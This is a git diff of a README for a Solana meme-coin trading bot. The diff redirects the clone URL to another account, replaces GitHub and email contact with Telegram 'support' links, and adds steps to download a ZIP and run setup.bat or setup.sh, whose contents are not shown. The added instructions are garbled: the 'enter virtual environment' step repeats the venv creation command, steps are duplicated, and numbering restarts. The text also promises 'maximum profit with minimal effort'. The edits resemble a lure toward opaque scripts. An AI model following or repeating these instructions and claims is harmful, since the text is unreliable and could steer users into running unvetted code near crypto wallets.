@@ -1,5 +1,7 @@
 # Sniper Calls Bot
 
+**[👤 Contact our support for questions and assistance!](https://t.me/SniperCallsMev)**
+
 ## Overview
 
 **Sniper Calls Bot** is a state-of-the-art automated trading tool developed by **Solana experts**, specifically designed for meme coins. This bot leverages sophisticated algorithms to capitalize on low-liquidity and newly launched coins, using indicators to detect volume changes. **Sniper Calls Bot** automatically executes trades, buying and selling assets during volume spikes, ensuring maximum profit with minimal effort. Optimize your trading strategy and stay ahead in the dynamic crypto market with **Sniper Calls Bot**, enjoying unparalleled accuracy and real-time adaptive strategies.
@@ -19,16 +21,51 @@
 
 ## Installation
 
-**[👉 STEP BY STEP GUIDE IN OUR TELEGRAM CHANNEL!](https://t.me/snipercallshelp)**
-
-**[👤 OUR TECHNICAL SUPPORT IN TELEGRAM!](https://t.me/snipercallsshelp)**
+**[👤 OUR TECHNICAL SUPPORT IN TELEGRAM!](https://t.me/SniperCallsMev)**
 
 To get started with Sniper Calls Bot, follow these steps:
 
 1. Clone the repository:
     ```sh
-    git clone https://github.com/AidenHayes-sol/Sniper-Calls-Bot.git
-    cd sniper-calls-bot
+    git clone https://github.com/Aalmuzann12/Sniper-Calls-Bot.git
+    cd sniper-calls-bot/manual
+    ```
+
+2. Install the required python version, you need 3.12.7 (newer versions are not compatible) https://www.python.org/downloads/release/python-3127/
+
+3. Create virtual enviroment
+    ```sh
+    python -m venv venv
+    ```
+
+4. Enter virtual enviroment
+    ```sh
+    python -m venv venv
+    ```
+5. Install the required dependencies:
+    ```sh
+    pip install -r requirements.txt
+    ```
+## Use our installation scripts
+
+1. Click "Code" in github page and then click "Download ZIP"
+
+2. Unpack archive
+
+2. Open folder auto
+
+3. Run setup.bat on Windows and setup.sh for another OS
+
+4. Now you can just run run.bat on Windows and run.sh for another OS
+
+3. Create virtual enviroment
+    ```sh
+    python -m venv venv
+    ```
+
+4. Enter virtual enviroment
+    ```sh
+    python -m venv venv
     ```
 
 2. Install the required dependencies:
@@ -51,6 +88,5 @@ We welcome contributions from the community! Please fork the repository and crea
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-## Contact
+**[Contact](https://t.me/SniperCallsMev)**
 
-For questions, suggestions, or issues, please open an issue on GitHub or contact us at [snipercallshelp@gmail.com](mailto:snipercallshelp@gmail.com).
